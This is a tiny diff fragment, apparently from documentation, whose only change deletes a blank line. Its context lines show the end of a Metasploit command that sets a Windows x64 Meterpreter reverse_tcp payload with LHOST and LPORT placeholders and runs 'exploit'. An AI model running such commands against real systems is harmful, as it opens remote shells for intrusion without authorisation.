@@ -10,7 +10,6 @@ set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
 set LHOST <local-ip>; \
 set LPORT <local-port>; \
 exploit"
-
 ```
 
 
